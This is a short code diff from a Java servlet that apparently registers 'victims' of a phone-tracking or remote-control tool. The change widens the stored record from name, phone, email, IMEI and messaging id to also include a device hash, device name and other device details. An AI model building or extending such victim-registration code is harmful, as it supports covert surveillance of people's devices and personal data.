@@ -71,8 +71,7 @@ public class INServlet extends BaseServlet {
                 //Preparing new api key for new victim
                 apiKey = RandomString.getNewApiKey(API_KEY_LENGTH);
 
-                final Victim newVictim = new Victim(name, phone, email, imei, apiKey, fcmId, null);
-
+                final Victim newVictim = new Victim(null, name, email, phone, imei, deviceHash, apiKey, fcmId, deviceName, otherDeviceInfo, null, null, true);
                 victimsTable.addv2(newVictim);
 
             } else {
